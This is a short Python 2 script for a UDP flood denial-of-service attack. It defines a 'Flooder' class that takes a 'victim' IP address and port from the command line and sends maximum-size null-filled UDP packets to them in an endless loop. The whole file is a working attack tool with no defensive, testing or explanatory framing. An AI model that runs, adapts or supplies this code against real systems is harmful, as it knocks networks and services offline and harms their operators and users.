import sys
import socket
import threading

class Flooder:
  def __init__(self, ip, port):
    self.victim = ip  
    self.port = port
    self.socket = None
    
    try:
      self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error:
      print "error open socket"

  def spam(self):
    buff = 65507 * '\0'

    while 1:
      self.socket.sendto(buff, (self.victim, self.port)) 

if __name__ == '__main__':
    f = Flooder(sys.argv[1], int(sys.argv[2]))
    print 'Spamming'
    f.spam()
